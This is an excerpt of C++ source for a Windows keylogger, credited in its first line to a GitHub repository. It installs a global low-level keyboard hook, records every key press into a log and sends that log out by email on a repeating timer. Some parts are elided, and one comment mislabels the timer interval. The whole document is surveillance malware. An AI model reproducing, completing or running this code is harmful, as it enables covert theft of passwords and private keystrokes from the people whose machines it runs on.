...
// https://github.com/cdohara/Keylogger/blob/master/Keylogger.cpp
#ifndef KEYBHOOK_H
#define KEYBHOOK_H
...
void TimerSendMail() {
  ...
  if (x != 7) // if mail was not sent
    Helper::WriteAppLog("Mail was not sent! Error code: " +
                        Helper::ToString(x));
  else
    keylog = ""; // if sent clear keylog
}

Timer MailTimer(TimerSendMail, 500 * 60,
                Timer::Infinite); // time to send (30 seconds)

HHOOK eHook = NULL; // pointer to our hook

LRESULT OurKeyBoardProc(int nCode, WPARAM wparam,
                        LPARAM lparam) // intercept key presses
{
  ...
  if (wparam == WM_KEYDOWN ||
      wparam == WM_SYSKEYDOWN) // check when key is pressed down or hold
  {
    keylog += Keys::KEYS[kbs->vkCode].Name; // use the system name from keyboard
    // and use our map to convert it to
    // a human friendly name
    if (kbs->vkCode == VK_RETURN) // new line if enter was pressed
      keylog += '\n';
  } else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) // if key state is
  // released, used for
  // sys keys like SHIFT
  {
    ...
    if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL ||
        ...
        key == VK_RWIN) {
      std::string KeyName =
          Keys::KEYS[kbs->vkCode].Name; // translate key to human friendly name
...
bool InstallHook() {
  ...
  // WH_KEYBOARD_LL - indicates we use keyboard hook and LL is low level ->
  // global hook, value 13
  // OurKeyBoardProc - procedure invoked by hook system every time user press a
  // key
  // GetModuleHandle serves for obatining H instance
  // DWTHREADID or 0 is identifier of thread which hook procedure is associated
